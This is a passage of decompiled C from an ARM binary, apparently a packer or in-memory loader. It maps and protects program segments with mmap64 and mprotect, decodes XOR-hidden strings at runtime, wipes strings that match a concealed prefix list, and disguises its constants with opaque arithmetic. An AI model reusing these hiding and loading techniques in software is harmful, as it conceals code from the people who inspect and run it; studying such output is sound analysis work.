    }
    iVar1 = 0;
  }
  return iVar1;
}



// ---- 000241b8  FUN_000241b8  size=176

void FUN_000241b8(int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
                 undefined4 param_5)

{
  int iVar1;
  int local_30 [2];
  undefined4 uStack_28;
  int local_24;
  
  local_24 = **(int **)(DAT_0002426c + 0x241d8);
  uStack_28 = param_3;
  iVar1 = FUN_000235dc(param_2,param_3,local_30);
  if (iVar1 == 0) {
    iVar1 = FUN_0002378c(param_1,local_30[0],param_4,param_5);
    if (iVar1 == 0) {
      *(uint *)(param_1 + 4) = (DAT_00024268 | 1) ^ DAT_00024268;
    }
    else {
      close(local_30[0]);
    }
  }
  if (**(int **)(DAT_00024270 + 0x24250) != local_24) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(local_24);
  }
  return;
}



// ---- 00024274  FUN_00024274  size=788

undefined4 FUN_00024274(int param_1,undefined4 param_2,uint param_3,uint param_4,uint *param_5)

{
  byte bVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  uint *puVar5;
  uint uVar6;
  uint uVar7;
  int unaff_r4;
  uint uVar8;
  undefined4 uVar9;
  uint *local_38;
  uint local_2c;
  uint local_28;
  
  uVar9 = 1;
  if (param_1 != 0) {
    iVar2 = param_1;
    if (param_5 != (uint *)0x0) {
      iVar2 = *(int *)(param_1 + 0x3c);
      unaff_r4 = param_1;
    }
    if ((((param_5 != (uint *)0x0 && iVar2 != 0) &&
         (uVar8 = *(uint *)(unaff_r4 + 0x68), uVar3 = uVar8 - (DAT_00024588 & uVar8 >> 1),
         uVar3 = (uVar3 & DAT_0002458c) + (DAT_0002458c & uVar3 >> 2),
         ((DAT_0002459c | 0x1000) ^ DAT_0002459c) <= uVar8 &&
         (uVar3 + (uVar3 >> 4) & DAT_00024590) * DAT_00024594 >> 0x18 <=
         ((DAT_00024598 | 1) ^ DAT_00024598))) &&
        (*(uint *)(unaff_r4 + 0x54) < param_4 ||
         param_4 - *(uint *)(unaff_r4 + 0x54) < (uint)(*(uint *)(unaff_r4 + 0x50) <= param_3))) &&
       (param_4 <= *(uint *)(unaff_r4 + 0x5c) &&
        (uint)(*(uint *)(unaff_r4 + 0x58) <= param_3) <= param_4 - *(uint *)(unaff_r4 + 0x5c))) {
      iVar2 = 0;
      uVar4 = uVar8;
      FUN_00035454(param_3,param_4);
      uVar3 = DAT_000245a8;
      if ((~param_4 != 0 || ~param_4 < (uint)(uVar8 <= ~param_3)) && (uVar4 == 0 && iVar2 == 0)) {
        param_5[0] = 0;
        param_5[1] = 0;
        param_5[2] = 0;
        param_5[3] = 0;
        *param_5 = 0;
        uVar4 = param_4 + CARRY4(uVar8,param_3);
        local_38 = (uint *)0x0;
        local_28 = 0;
        local_2c = 0;
        for (iVar2 = 0; iVar2 != *(int *)(unaff_r4 + 0x40);
            iVar2 = iVar2 + (DAT_000245a4 + 1 ^ DAT_000245a4)) {
          puVar5 = (uint *)(*(int *)(unaff_r4 + 0x3c) + iVar2 * 0x20);
          if ((*puVar5 == (uVar3 ^ uVar3 + 1)) && (uVar6 = puVar5[5], uVar6 != 0)) {
            uVar7 = puVar5[2];
            if (((uint)(uVar8 + param_3 <= uVar7) <= -uVar4) &&
               (param_4 <= CARRY4(uVar7,uVar6) &&
                (uint)(uVar7 + uVar6 <= param_3) <= param_4 - CARRY4(uVar7,uVar6))) {
              bVar1 = (byte)puVar5[6];
              local_2c = local_2c |
                         ((uint)(byte)((((bVar1 & 1) << 1 | bVar1 >> 1 & 1) << 1 | bVar1 >> 2 & 1)
                                      << 5) << 0x18) >> 0x1d;
              local_28 = local_28 + (DAT_000245a0 ^ DAT_000245a0 + 1);
              local_38 = puVar5;
            }
          }
        }
        uVar9 = 0;
        param_5[1] = local_2c;
        if (local_28 != 0) {
          *param_5 = (DAT_000245ac | 2) ^ DAT_000245ac;
          puVar5 = local_38;
          if (local_38 != (uint *)0x0) {
            puVar5 = (uint *)0x1;
          }
          if ((((uint)(local_28 == ((DAT_000245b0 | 1) ^ DAT_000245b0)) & (uint)puVar5) == 1) &&
             (uVar6 = local_38[2], uVar3 = (uint)CARRY4(local_38[4],uVar6),
             (param_4 != 0 || param_4 < (uVar6 <= param_3)) &&
             (uVar4 < uVar3 || uVar3 - uVar4 < (uint)(uVar8 + param_3 <= local_38[4] + uVar6)))) {
            uVar8 = local_38[1];
            uVar3 = param_3 - uVar6;
            iVar2 = param_4 - (param_3 < uVar6);
            if (iVar2 != -1 || -iVar2 - 1U < (uint)(uVar3 <= ~uVar8)) {
              uVar7 = uVar3 + uVar8;
              uVar4 = *(uint *)(unaff_r4 + 0x68);
              uVar6 = iVar2 + (uint)CARRY4(uVar3,uVar8);
              iVar2 = 0;
              uVar8 = uVar4;
              FUN_00035454(uVar7,uVar6);
              uVar3 = DAT_000245b4;
              if (uVar8 == 0 && iVar2 == 0) {
                uVar8 = uVar6 + CARRY4(uVar7,uVar4);
                if ((~uVar6 != 0 || ~uVar6 < (uint)(uVar4 <= ~uVar7)) &&
                   (uVar8 < *(uint *)(unaff_r4 + 0x4c) ||
                    *(uint *)(unaff_r4 + 0x4c) - uVar8 <
                    (uint)(uVar7 + uVar4 <= *(uint *)(unaff_r4 + 0x48)))) {
                  param_5[2] = uVar7;
                  param_5[3] = uVar6;
                  *param_5 = (uVar3 | 1) ^ uVar3;
                }
              }
            }
          }
        }
      }
    }
  }
  return uVar9;
}



// ---- 000245b8  FUN_000245b8  size=1624

void FUN_000245b8(int *param_1)

{
  bool bVar1;
  bool bVar2;
  longlong lVar3;
  longlong lVar4;
  undefined uVar5;
  void *pvVar6;
  int iVar7;
  uint *puVar8;
  size_t sVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  uint uVar14;
  uint uVar15;
  int *piVar16;
  uint uVar17;
  uint uVar18;
  int iVar19;
  void *pvVar20;
  longlong *plVar21;
  uint uVar22;
  undefined *puVar23;
  uint uVar24;
  undefined auStack_98 [16];
  undefined auStack_88 [16];
  int local_78 [4];
  __off64_t *local_68;
  undefined *local_64;
  undefined *local_60;
  longlong *local_5c;
  uint local_58;
  void *local_54;
  size_t local_50;
  int *local_4c;
  void *local_48;
  uint local_44;
  uint local_40;
  uint local_3c;
  uint local_38;
  uint local_34;
  uint local_30;
  int local_2c;
  
  local_2c = **(int **)(DAT_00024c38 + 0x245d8);
  puVar23 = auStack_88;
  if ((((param_1 != (int *)0x0) && (-1 < *param_1)) && (param_1[0xf] != 0)) && (param_1[0x1b] == 0))
  {
    plVar21 = (longlong *)(param_1 + 0x14);
    pvVar20 = *(void **)plVar21;
    sVar9 = param_1[0x16] - (int)pvVar20;
    param_1[0x1c] = sVar9;
    if (*(short *)(param_1 + 6) != 2) {
      pvVar20 = (void *)0x0;
    }
    uVar12 = (DAT_00024c10 | 0x22) ^ DAT_00024c10;
    if (*(short *)(param_1 + 6) == 2) {
      uVar12 = 0x100022;
    }
    local_4c = local_78;
    pvVar6 = mmap64(pvVar20,sVar9,0,uVar12,-1,0);
    if (pvVar6 != (void *)0xffffffff) {
      if ((pvVar6 == pvVar20) || (*(short *)(param_1 + 6) != 2)) {
        if (pvVar6 < *(void **)plVar21) {
          munmap(pvVar6,param_1[0x1c]);
        }
        else {
          iVar7 = 0;
          sVar9 = param_1[0x1c];
          if (*(short *)(param_1 + 6) == 3) {
            iVar7 = (int)pvVar6 - (int)*(void **)plVar21;
          }
          param_1[0x1d] = iVar7;
          param_1[0x1b] = (int)pvVar6;
          local_60 = auStack_98;
          local_5c = plVar21;
          local_50 = FUN_00035060(sVar9,param_1[0x1a]);
          local_54 = calloc(local_50,(DAT_00024c14 | 1) ^ DAT_00024c14);
          if (local_54 != (void *)0x0) {
            local_68 = (__off64_t *)(local_4c + 2);
            piVar16 = local_4c;
            plVar21 = local_5c;
            local_64 = puVar23;
            for (uVar12 = 0; uVar12 < local_50; uVar12 = uVar12 + (DAT_00024c18 + 1 ^ DAT_00024c18))
            {
              sVar9 = param_1[0x1a];
              iVar19 = param_1[0x1b];
              lVar3 = (ulonglong)uVar12 * (ulonglong)sVar9 + *plVar21;
              local_40 = (uint)lVar3;
              local_44 = (uint)((ulonglong)lVar3 >> 0x20);
              iVar7 = FUN_00024274(param_1);
              if (iVar7 != 0) goto LAB_00024bb0;
              if (*piVar16 != 0) {
                pvVar20 = (void *)(iVar19 + uVar12 * sVar9);
                local_58 = uVar12;
                if (*piVar16 == 1) {
                  pvVar6 = mmap64(pvVar20,sVar9,piVar16[1],DAT_00024c24 ^ DAT_00024c24 + 0xe,
                                  *param_1,*local_68);
                  uVar12 = (int)pvVar6 + 1;
                  if (uVar12 != 0) {
                    uVar12 = 1;
                  }
                  uVar5 = 2;
                  if ((uVar12 & pvVar6 == pvVar20) == 0) {
                    sVar9 = param_1[0x1a];
                    goto LAB_00024840;
                  }
                }
                else {
LAB_00024840:
                  pvVar6 = mmap64(pvVar20,sVar9,DAT_00024c28 + 3 ^ DAT_00024c28,
                                  DAT_00024c20 + 0xe ^ DAT_00024c20,-1,0);
                  if ((pvVar6 == (void *)0xffffffff) || (local_48 = pvVar20, pvVar6 != pvVar20))
                  goto LAB_00024bb0;
                  uVar12 = DAT_00024c1c;
                  uVar18 = DAT_00024c2c;
                  uVar11 = local_44;
                  uVar24 = local_40;
                  for (uVar22 = 0; uVar22 < (uint)param_1[0x10];
                      uVar22 = uVar22 + (uVar12 ^ uVar12 + 1)) {
                    uVar17 = uVar24 + param_1[0x1a];
                    puVar8 = (uint *)(param_1[0xf] + uVar22 * 0x20);
                    uVar15 = uVar11 + CARRY4(uVar24,param_1[0x1a]);
                    if ((*puVar8 == (uVar18 + 1 ^ uVar18)) && (uVar13 = puVar8[5], uVar13 != 0)) {
                      uVar10 = puVar8[2];
                      local_30 = puVar8[4] + uVar10;
                      local_34 = (uint)CARRY4(puVar8[4],uVar10);
                      uVar18 = local_30;
                      uVar12 = local_34;
                      if (uVar15 <= local_34 && (uint)(local_30 <= uVar17) <= uVar15 - local_34) {
                        uVar18 = uVar17;
                        uVar12 = uVar15;
                      }
                      local_38 = uVar10 + uVar13;
                      local_3c = (uint)CARRY4(uVar10,uVar13);
                      uVar14 = uVar24;
                      uVar13 = uVar11;
                      if (uVar11 == 0 && (uVar10 <= uVar24) <= uVar11) {
                        uVar13 = 0;
                        uVar14 = uVar10;
                      }
                      if (uVar13 <= uVar12 && (uint)(uVar18 <= uVar14) <= uVar13 - uVar12) {
                        uVar12 = puVar8[1];
                        uVar11 = uVar14 - uVar10;
                        iVar7 = uVar13 - (uVar14 < uVar10);
                        if ((iVar7 == -1 && (uint)(uVar11 <= ~uVar12) <= -iVar7 - 1U) ||
                           (iVar7 = FUN_000240ec(*param_1,(int)local_48 + (uVar14 - uVar24),
                                                 uVar18 - uVar14,local_48,uVar11 + uVar12,
                                                 iVar7 + (uint)CARRY4(uVar11,uVar12)),
                           uVar11 = local_44, uVar24 = local_40, iVar7 != 0)) goto LAB_00024bb0;
                      }
                      uVar18 = DAT_00024c2c;
                      uVar12 = DAT_00024c1c;
                      bVar1 = (uint)(local_38 <= uVar17) <= uVar15 - local_3c;
                      uVar13 = local_3c;
                      if (uVar15 <= local_3c && bVar1) {
                        uVar13 = uVar15;
                      }
                      bVar2 = uVar11 - local_34 < (uint)(local_30 <= uVar24);
                      uVar10 = local_34;
                      if (local_34 < uVar11 || bVar2) {
                        uVar10 = uVar11;
                      }
                      uVar14 = local_38;
                      if (uVar15 <= local_3c && bVar1) {
                        uVar14 = uVar17;
                      }
                      uVar15 = local_30;
                      if (local_34 < uVar11 || bVar2) {
                        uVar15 = uVar24;
                      }
                      if (uVar10 <= uVar13 && (uint)(uVar14 <= uVar15) <= uVar10 - uVar13) {
                        FUN_0003524c((int)local_48 + (uVar15 - uVar24),uVar14 - uVar15);
                        uVar11 = local_44;
                        uVar24 = local_40;
                      }
                    }
                  }
                  uVar5 = 1;
                  puVar23 = local_64;
                }
                *(undefined *)((int)local_54 + local_58) = uVar5;
                piVar16 = local_4c;
                uVar12 = local_58;
                plVar21 = local_5c;
              }
            }
            uVar12 = 0;
            while( true ) {
              while( true ) {
                if (local_50 <= uVar12) {
                  free(local_54);
                  iVar7 = *(int *)(plVar21 + 2);
                  param_1[0x1e] = param_1[8] + param_1[0x1d];
                  param_1[0x1f] = param_1[0x1d] + iVar7;
                  goto LAB_00024624;
                }
                if (*(char *)((int)local_54 + uVar12) == '\x01') break;
                uVar12 = uVar12 + (DAT_00024c30 ^ DAT_00024c30 + 1);
                puVar23 = local_64;
              }
              lVar3 = *plVar21;
              uVar18 = param_1[0x1a];
              iVar7 = FUN_00024274(param_1);
              if (iVar7 != 0) break;
              local_30 = *(uint *)(puVar23 + 4);
              local_34 = uVar12;
              do {
                puVar23 = local_60;
                uVar12 = uVar12 + (DAT_00024c34 + 1 ^ DAT_00024c34);
                if ((local_50 <= uVar12) || (*(char *)((int)local_54 + uVar12) != '\x01')) break;
                lVar4 = (ulonglong)uVar18 * (ulonglong)uVar12 + lVar3;
                iVar7 = FUN_00024274(param_1,DAT_00024c34,(int)lVar4,(int)((ulonglong)lVar4 >> 0x20)
                                     ,local_60);
                if (iVar7 != 0) goto LAB_00024bb0;
              } while (*(uint *)(puVar23 + 4) == local_30);
              iVar7 = mprotect((void *)(uVar18 * local_34 + param_1[0x1b]),
                               (uVar12 - local_34) * uVar18,local_30);
              plVar21 = local_5c;
              puVar23 = local_64;
              if (iVar7 != 0) break;
            }
LAB_00024bb0:
            free(local_54);
            pvVar6 = (void *)param_1[0x1b];
            sVar9 = param_1[0x1c];
          }
          munmap(pvVar6,sVar9);
          param_1[0x1b] = 0;
          param_1[0x1c] = 0;
          param_1[0x1d] = 0;
        }
      }
      else {
        munmap(pvVar6,param_1[0x1c]);
      }
    }
  }
LAB_00024624:
  if (**(int **)(DAT_00024c3c + 0x24634) == local_2c) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail(local_2c);
}



// ---- 00024c40  FUN_00024c40  size=84

void FUN_00024c40(int *param_1)

{
  if (param_1 == (int *)0x0) {
    return;
  }
  free((void *)param_1[0xf]);
  param_1[0xf] = 0;
  param_1[0x10] = 0;
  if ((param_1[1] != 0) && (-1 < *param_1)) {
    close(*param_1);
  }
  *param_1 = -1;
  param_1[1] = 0;
  return;
}



// ---- 00024c94  FUN_00024c94  size=380

void FUN_00024c94(undefined4 param_1)

{
  byte bVar1;
  byte bVar2;
  byte bVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  byte *pbVar7;
  int *piVar8;
  
  iVar5 = DAT_00024e24;
  iVar4 = DAT_00024e20;
  iVar6 = **(int **)(DAT_00024e18 + 0x24ca8);
  piVar8 = (int *)(DAT_00024e1c + 0x24cbc);
  DataMemoryBarrier(0xb);
  pbVar7 = (byte *)(DAT_00024e20 + 0x24cd0);
  if (*piVar8 == 0) {
    bVar1 = *(byte *)(DAT_00024e24 + 0x24cdd);
    bVar2 = *(byte *)(DAT_00024e24 + 0x24cde);
    *pbVar7 = *(byte *)(DAT_00024e24 + 0x24cdc) ^ 0x66;
    bVar3 = *(byte *)(iVar5 + 0x24cdf);
    *(byte *)(iVar4 + 0x24cd1) = bVar1 ^ 0x8d;
    *(byte *)(iVar4 + 0x24cd2) = bVar2 ^ 0x29;
    *(byte *)(iVar4 + 0x24cd3) = bVar3 ^ 0x2c;
    bVar1 = *(byte *)(iVar5 + 0x24ce7);
    *(byte *)(iVar4 + 0x24cd4) = *(byte *)(iVar5 + 0x24ce0) ^ 0x47;
    bVar2 = *(byte *)(iVar5 + 0x24ce8);
    *(byte *)(iVar4 + 0x24cd5) = *(byte *)(iVar5 + 0x24ce1) ^ 0x4c;
    bVar3 = *(byte *)(iVar5 + 0x24ce9);
    *(byte *)(iVar4 + 0x24cd6) = *(byte *)(iVar5 + 0x24ce2) ^ 0x45;
    *(byte *)(iVar4 + 0x24cd7) = *(byte *)(iVar5 + 0x24ce3) ^ 0x83;
    *(byte *)(iVar4 + 0x24cd8) = *(byte *)(iVar5 + 0x24ce4) ^ 0xa4;
    *(byte *)(iVar4 + 0x24cd9) = *(byte *)(iVar5 + 0x24ce5) ^ 0x73;
    *(byte *)(iVar4 + 0x24cda) = *(byte *)(iVar5 + 0x24ce6) ^ 0x5b;
    *(byte *)(iVar4 + 0x24cdb) = bVar1 ^ 5;
    *(byte *)(iVar4 + 0x24cdc) = bVar2 ^ 0x2e;
    *(byte *)(iVar4 + 0x24cdd) = bVar3 ^ 0xa2;
    *(byte *)(iVar4 + 0x24cde) = *(byte *)(iVar5 + 0x24cea) ^ 0x38;
    *(byte *)(iVar4 + 0x24cdf) = *(byte *)(iVar5 + 0x24ceb) ^ 0x26;
    *(byte *)(iVar4 + 0x24ce0) = *(byte *)(iVar5 + 0x24cec) ^ 0x1c;
  }
  DataMemoryBarrier(0xb);
  *piVar8 = 1;
  __vsnprintf_chk(param_1,(DAT_00024e10 | 0x40) ^ DAT_00024e10,0,
                  (DAT_00024e14 | 0x40) ^ DAT_00024e14,pbVar7,&stack0x00000000,&stack0x00000000);
  if (**(int **)(DAT_00024e28 + 0x24dfc) != iVar6) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}



// ---- 00024e2c  FUN_00024e2c  size=244

undefined4 FUN_00024e2c(uint *param_1,uint *param_2)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  
  if (param_1 == (uint *)0x0 || param_2 == (uint *)0x0) {
    return 0xffffffff;
  }
  param_2[0] = 0;
  param_2[1] = 0;
  param_2[2] = 0;
  param_2[3] = 0;
  param_2[4] = 0;
  uVar4 = *param_1;
  if ((uVar4 <= ((DAT_00024f20 | 0x10000) ^ DAT_00024f20)) &&
     (*param_2 = uVar4, uVar1 = DAT_00024f28, uVar3 = DAT_00024f24, param_1[uVar4 + 1] == 0)) {
    param_1 = param_1 + uVar4 + 2;
    param_2[1] = (uint)param_1;
    uVar2 = DAT_00024f30;
    uVar4 = DAT_00024f2c;
    for (uVar5 = 0; uVar5 != (uVar1 + 0x10000 ^ uVar1); uVar5 = uVar5 + (uVar3 + 1 ^ uVar3)) {
      if (param_1[uVar5] == 0) {
        uVar3 = 0;
        param_2[2] = uVar5;
        param_2[3] = (uint)(param_1 + uVar5 + 1);
        while( true ) {
          if (uVar3 == (uVar4 ^ uVar4 + 0x100)) {
            return 0xffffffff;
          }
          if ((param_1 + uVar5 + 1)[uVar3 * 2] == 0) break;
          uVar3 = uVar3 + (uVar2 + 1 ^ uVar2);
        }
        param_2[4] = uVar3;
        return 0;
      }
    }
  }
  return 0xffffffff;
}



// ---- 00024f34  FUN_00024f34  size=124

undefined4 FUN_00024f34(int param_1,int param_2,int *param_3)

{
  bool bVar1;
  uint uVar2;
  undefined4 uVar3;
  int iVar4;
  int *piVar5;
  int iVar6;
  
  uVar2 = DAT_00024fb0;
  if (param_1 == 0 || param_3 == (int *)0x0) {
    return 0xffffffff;
  }
  iVar6 = *(int *)(param_1 + 0x10);
  iVar4 = 0;
  bVar1 = false;
  do {
    if (iVar4 == iVar6) {
      uVar3 = 0;
      if (!bVar1) {
        uVar3 = 0xffffffff;
      }
      return uVar3;
    }
    piVar5 = (int *)(*(int *)(param_1 + 0xc) + iVar4 * 8);
    if (*piVar5 == param_2) {
      if (bVar1) {
        return 0xffffffff;
      }
      *param_3 = piVar5[1];
      bVar1 = true;
    }
    iVar4 = iVar4 + (uVar2 ^ uVar2 + 1);
  } while( true );
}



// ---- 00024fb4  FUN_00024fb4  size=352

void FUN_00024fb4(uint param_1,int param_2,void *param_3,undefined4 param_4)

{
  uint uVar1;
  int iVar2;
  size_t sVar3;
  void *unaff_r4;
  uint uVar4;
  char *__s;
  int local_40 [2];
  int local_38 [2];
  int local_30;
  int local_2c;
  undefined4 uStack_28;
  
  local_2c = **(int **)(DAT_00025124 + 0x24fd4);
  local_30 = param_2;
  uStack_28 = param_4;
  if (param_1 <= ((DAT_00025114 | 0x10000) ^ DAT_00025114)) {
    if (param_2 != 0) {
      unaff_r4 = param_3;
    }
    if (((param_2 != 0 && param_3 != (void *)0x0) && (*(int *)(param_2 + param_1 * 4) == 0)) &&
       (iVar2 = FUN_0002512c(unaff_r4,local_38), iVar2 == 0)) {
      for (uVar4 = 0; uVar1 = DAT_00025120, uVar4 != param_1;
          uVar4 = uVar4 + (DAT_00025118 ^ DAT_00025118 + 1)) {
        iVar2 = *(int *)(param_2 + uVar4 * 4);
        if ((local_38[0] != iVar2) || (iVar2 = FUN_0002512c(iVar2,local_40), iVar2 != 0))
        goto LAB_00025010;
        local_38[0] = local_40[0];
      }
      local_30 = local_38[0];
      for (uVar4 = 0; uVar4 != param_1; uVar4 = uVar4 + (uVar1 ^ uVar1 + 1)) {
        __s = *(char **)(param_2 + uVar4 * 4);
        sVar3 = strlen(__s);
        sVar3 = sVar3 + (DAT_0002511c + 1 ^ DAT_0002511c);
        memmove(unaff_r4,__s,sVar3);
        *(void **)(param_2 + uVar4 * 4) = unaff_r4;
        unaff_r4 = (void *)(sVar3 + (int)unaff_r4);
      }
      FUN_0003524c(unaff_r4,local_30 - (int)unaff_r4);
    }
  }
LAB_00025010:
  if (**(int **)(DAT_00025128 + 0x25020) != local_2c) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(local_2c);
  }
  return;
}



// ---- 0002512c  FUN_0002512c  size=116

undefined4 FUN_0002512c(char *param_1,undefined4 *param_2)

{
  size_t sVar1;
  undefined4 uVar2;
  undefined4 *unaff_r5;
  
  uVar2 = 0xffffffff;
  if (param_1 != (char *)0x0) {
    unaff_r5 = param_2;
  }
  if ((param_1 != (char *)0x0 && param_2 != (undefined4 *)0x0) &&
     (sVar1 = strlen(param_1), sVar1 != 0xffffffff && param_1 <= (char *)(-2 - sVar1))) {
    uVar2 = 0;
    *unaff_r5 = param_1 + sVar1 + ((DAT_000251a0 | 1) ^ DAT_000251a0);
  }
  return uVar2;
}



// ---- 000251a4  FUN_000251a4  size=136

void FUN_000251a4(int param_1,int param_2)

{
  uint uVar1;
  int iVar2;
  size_t sVar3;
  char *__s;
  uint uVar4;
  
  uVar1 = DAT_0002522c;
  if (param_1 == 0) {
    return;
  }
  for (uVar4 = 0; uVar4 < *(uint *)(param_1 + 8); uVar4 = uVar4 + (uVar1 ^ uVar1 + 1)) {
    __s = *(char **)(*(int *)(param_1 + 4) + uVar4 * 4);
    iVar2 = FUN_00025230(__s);
    if ((iVar2 != 0) && ((param_2 != 0 || (iVar2 = FUN_00025568(__s), iVar2 == 0)))) {
      sVar3 = strlen(__s);
      FUN_0003524c(__s,sVar3);
    }
  }
  return;
}



// ---- 00025230  FUN_00025230  size=784

undefined4 FUN_00025230(char *param_1)

{
  byte bVar1;
  byte bVar2;
  byte bVar3;
  byte bVar4;
  uint uVar5;
  uint uVar6;
  int *piVar7;
  size_t __n;
  int iVar8;
  byte *pbVar9;
  uint uVar10;
  char *__s;
  undefined4 uVar11;
  int iVar12;
  
  iVar8 = DAT_00025550;
  iVar12 = DAT_0002554c;
  piVar7 = (int *)(DAT_00025548 + 0x25248);
  DataMemoryBarrier(0xb);
  if (*piVar7 == 0) {
    bVar1 = *(byte *)(DAT_0002554c + 0x25260);
    bVar2 = *(byte *)(DAT_0002554c + 0x25262);
    bVar3 = *(byte *)(DAT_0002554c + 0x25263);
    pbVar9 = (byte *)(DAT_00025550 + 0x25280);
    *(byte *)(DAT_00025550 + 0x25281) = *(byte *)(DAT_0002554c + 0x25261) ^ 0x38;
    *(byte *)(iVar8 + 0x25282) = bVar2 ^ 0x26;
    *(byte *)(iVar8 + 0x25283) = bVar3 ^ 0x1c;
    bVar2 = *(byte *)(iVar12 + 0x2526b);
    *(byte *)(iVar8 + 0x25284) = *(byte *)(iVar12 + 0x25264) ^ 0xae;
    bVar3 = *(byte *)(iVar12 + 0x2526c);
    *(byte *)(iVar8 + 0x25285) = *(byte *)(iVar12 + 0x25265) ^ 0xe6;
    bVar4 = *(byte *)(iVar12 + 0x25266);
    *pbVar9 = bVar1 ^ 0xa2;
    *(byte *)(iVar8 + 0x25286) = bVar4 ^ 0x37;
    bVar1 = *(byte *)(iVar12 + 0x2526d);
    *(byte *)(iVar8 + 0x25287) = *(byte *)(iVar12 + 0x25267) ^ 4;
    *(byte *)(iVar8 + 0x25288) = *(byte *)(iVar12 + 0x25268) ^ 0xae;
    *(byte *)(iVar8 + 0x25289) = *(byte *)(iVar12 + 0x25269) ^ 0x53;
    *(byte *)(iVar8 + 0x2528a) = *(byte *)(iVar12 + 0x2526a) ^ 0xac;
    *(byte *)(iVar8 + 0x2528b) = bVar2 ^ 6;
    *(byte *)(iVar8 + 0x2528c) = bVar3 ^ 0x7a;
    *(byte *)(iVar8 + 0x2528d) = bVar1 ^ 0x67;
    bVar1 = *(byte *)(iVar12 + 0x25274);
    *(byte *)(iVar8 + 0x2528e) = *(byte *)(iVar12 + 0x2526e) ^ 0xc9;
    bVar2 = *(byte *)(iVar12 + 0x25275);
    *(byte *)(iVar8 + 0x2528f) = *(byte *)(iVar12 + 0x2526f) ^ 0xa6;
    bVar3 = *(byte *)(iVar12 + 0x25276);
    *(byte *)(iVar8 + 0x25290) = *(byte *)(iVar12 + 0x25270) ^ 0x1a;
    *(byte *)(iVar8 + 0x25291) = *(byte *)(iVar12 + 0x25271) ^ 0x23;
    *(byte *)(iVar8 + 0x25292) = *(byte *)(iVar12 + 0x25272) ^ 0xdc;
    bVar4 = *(byte *)(iVar12 + 0x25277);
    *(byte *)(iVar8 + 0x25293) = *(byte *)(iVar12 + 0x25273) ^ 0x6b;
    *(byte *)(iVar8 + 0x25294) = bVar1 ^ 0x2a;
    *(byte *)(iVar8 + 0x25295) = bVar2 ^ 0xda;
    *(byte *)(iVar8 + 0x25296) = bVar3 ^ 0x44;
    *(byte *)(iVar8 + 0x25297) = bVar4 ^ 0xa0;
    iVar8 = DAT_00025558;
    iVar12 = DAT_00025554;
    bVar1 = *(byte *)(DAT_00025554 + 0x25390);
    bVar2 = *(byte *)(DAT_00025554 + 0x25392);
    bVar3 = *(byte *)(DAT_00025554 + 0x25393);
    pbVar9 = (byte *)(DAT_00025558 + 0x253b0);
    *(byte *)(DAT_00025558 + 0x253b1) = *(byte *)(DAT_00025554 + 0x25391) ^ 0x66;
    *(byte *)(iVar8 + 0x253b2) = bVar2 ^ 0x8d;
    *(byte *)(iVar8 + 0x253b3) = bVar3 ^ 0x29;
    bVar2 = *(byte *)(iVar12 + 0x25394);
    *pbVar9 = bVar1 ^ 0x34;
    *(byte *)(iVar8 + 0x253b4) = bVar2 ^ 0x2c;
    *(byte *)(iVar8 + 0x253b5) = *(byte *)(iVar12 + 0x25395) ^ 0x47;
    *(byte *)(iVar8 + 0x253b6) = *(byte *)(iVar12 + 0x25396) ^ 0x4c;
    *(byte *)(iVar8 + 0x253b7) = *(byte *)(iVar12 + 0x25397) ^ 0x45;
    *(byte *)(iVar8 + 0x253b8) = *(byte *)(iVar12 + 0x25398) ^ 0x83;
    *(byte *)(iVar8 + 0x253b9) = *(byte *)(iVar12 + 0x25399) ^ 0xa4;
    *(byte *)(iVar8 + 0x253ba) = *(byte *)(iVar12 + 0x2539a) ^ 0x73;
    *(byte *)(iVar8 + 0x253bb) = *(byte *)(iVar12 + 0x2539b) ^ 0x5b;
    bVar1 = *(byte *)(iVar12 + 0x2539d);
    *(byte *)(iVar8 + 0x253bc) = *(byte *)(iVar12 + 0x2539c) ^ 5;
    *(byte *)(iVar8 + 0x253bd) = bVar1 ^ 0x2e;
    iVar8 = DAT_00025560;
    iVar12 = DAT_0002555c;
    *(byte *)(DAT_00025560 + 0x25458) = *(byte *)(DAT_0002555c + 0x25448) ^ 0x59;
    *(byte *)(iVar8 + 0x25459) = *(byte *)(iVar12 + 0x25449) ^ 0xf4;
    *(byte *)(iVar8 + 0x2545a) = *(byte *)(iVar12 + 0x2544a) ^ 0x11;
    *(byte *)(iVar8 + 0x2545b) = *(byte *)(iVar12 + 0x2544b) ^ 0x7d;
    *(byte *)(iVar8 + 0x2545c) = *(byte *)(iVar12 + 0x2544c) ^ 0x52;
    *(byte *)(iVar8 + 0x2545d) = *(byte *)(iVar12 + 0x2544d) ^ 0xa2;
    *(byte *)(iVar8 + 0x2545e) = *(byte *)(iVar12 + 0x2544e) ^ 0xef;
    *(byte *)(iVar8 + 0x2545f) = *(byte *)(iVar12 + 0x2544f) ^ 0x8b;
    bVar1 = *(byte *)(iVar12 + 0x25451);
    *(byte *)(iVar8 + 0x25460) = *(byte *)(iVar12 + 0x25450) ^ 0x2e;
    *(byte *)(iVar8 + 0x25461) = bVar1 ^ 0x2c;
  }
  uVar11 = 0;
  DataMemoryBarrier(0xb);
  *piVar7 = 1;
  uVar6 = DAT_00025544;
  uVar5 = DAT_00025540;
  if (param_1 != (char *)0x0) {
    uVar10 = 0;
    iVar12 = DAT_00025564 + 0x254f4;
    do {
      if (uVar10 == (uVar6 + 1 ^ uVar6)) {
        return 0;
      }
      __s = *(char **)(iVar12 + uVar10 * 4);
      __n = strlen(__s);
      iVar8 = strncmp(param_1,__s,__n);
      uVar10 = uVar10 + (uVar5 ^ uVar5 + 1);
    } while (iVar8 != 0);
    uVar11 = 1;
  }
  return uVar11;
}



// ---- 00025568  FUN_00025568  size=400

bool FUN_00025568(char *param_1)

{
  byte bVar1;
  byte bVar2;
  byte bVar3;
  int iVar4;
  int iVar5;
  int *piVar6;
  
  iVar4 = DAT_00025704;
  iVar5 = DAT_00025700;
  piVar6 = (int *)(DAT_000256fc + 0x2557c);
  DataMemoryBarrier(0xb);
  if (*piVar6 == 0) {
